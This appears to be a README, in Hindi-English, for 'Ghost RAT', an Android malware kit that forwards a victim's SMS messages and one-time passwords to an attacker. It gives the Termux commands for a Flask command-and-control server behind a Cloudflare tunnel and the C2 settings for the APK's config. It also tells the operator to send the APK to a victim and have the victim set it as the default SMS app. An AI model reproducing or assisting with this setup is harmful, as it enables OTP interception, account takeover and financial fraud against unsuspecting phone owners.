# Ghost RAT

Live SMS OTP forwarder.
**Developed by Aditya**

---

## Setup

### 1. Termux install karo

F-Droid se: https://f-droid.org/packages/com.termux/

### 2. Termux kholo, ye chalao

```bash
pkg update -y && pkg upgrade -y
pkg install python cloudflared -y
pip install flask
```

### 3. `server.py` banao

```bash
mkdir -p ~/ghost
cd ~/ghost
nano server.py
```

Upar wala `server.py` code paste karo. Save: `Ctrl+O` → Enter → `Ctrl+X`.

**Apna port badalna ho to `PORT = 8000` line badlo.**

### 4. Server chalao

```bash
cd ~/ghost
python server.py
```

Output aayega:

```
============================================================
  GHOST RAT - Developed by Aditya
============================================================
  Port:     8000
  AUTH_KEY: ghostrat
============================================================

 * Running on http://0.0.0.0:8000
Press CTRL+C to quit

============================================================
  CLOUDFLARE TUNNEL READY
============================================================

  APK ke assets/config.txt me daalo:

    C2_HOST=xxxx-yyyy-zzzz.trycloudflare.com
    C2_PATH=/ghost
    AUTH_KEY=ghostrat

============================================================
  Panel: https://xxxx-yyyy-zzzz.trycloudflare.com
============================================================
```

Ye terminal **khuli chhod do**. Server chalta rahega.

---

## APK me daalo

AIDE me `app/src/main/assets/config.txt` kholo:

```
C2_HOST=xxxx-yyyy-zzzz.trycloudflare.com
C2_PATH=/ghost
AUTH_KEY=ghostrat
```

- `C2_HOST` = jo tunnel URL terminal pe dikha
- `AUTH_KEY` = jo `server.py` me rakhi

Save → AIDE me **Run** → APK install → victim ko bhejo.

---

## Victim ke phone pe

1. APK install
2. App kholo
3. Permissions → **Allow**
4. **Set as default SMS app** → **Set**
5. Done

Uske baad har SMS aate hi tumhare Termux pe forward hoga.

---

## SMS dekho

Browser me kholo:

```
https://xxxx-yyyy-zzzz.trycloudflare.com
```

Ya recent SMS:

```
https://xxxx-yyyy-zzzz.trycloudflare.com/SMS?did=DEVICE_ID
```

DEVICE_ID wahi jo terminal pe `NEW_DEVICE` me aata hai.

---

## Band karo

Termux me `Ctrl+C` dabao.

Ya:

```bash
pkill -9 -f server.py
pkill -9 -f cloudflared
```

---

## Note

- Tunnel URL **har restart pe badalta hai**. Naya URL `config.txt` me daalo, APK rebuild karo.
- Termux session band mat karo — server chalta rahe.

---

**Developed by Aditya**
